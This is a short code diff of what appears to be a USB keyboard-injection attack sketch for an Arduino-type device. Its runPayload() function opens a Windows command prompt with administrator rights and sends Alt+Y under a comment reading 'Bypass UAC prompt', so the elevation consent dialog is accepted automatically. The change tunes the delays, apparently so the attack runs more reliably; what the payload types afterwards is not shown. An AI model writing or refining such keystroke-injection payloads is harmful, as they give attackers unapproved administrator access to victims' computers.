@@ -20,7 +20,7 @@ void runPayload() {
 	typeKey(KEY_LEFT_GUI);
 	delay(500);
 	Keyboard.print("cmd");
-	delay(200);
+	delay(500);
 	Keyboard.press(KEY_LEFT_CTRL);
 	Keyboard.press(KEY_LEFT_SHIFT);
 	Keyboard.press(KEY_RETURN);
@@ -32,7 +32,7 @@ void runPayload() {
 	// Bypass UAC prompt
 	Keyboard.press(KEY_LEFT_ALT);
 	Keyboard.press('y');
-	delay(100);
+	delay(500);
 	Keyboard.releaseAll();
 
 	delay(200);
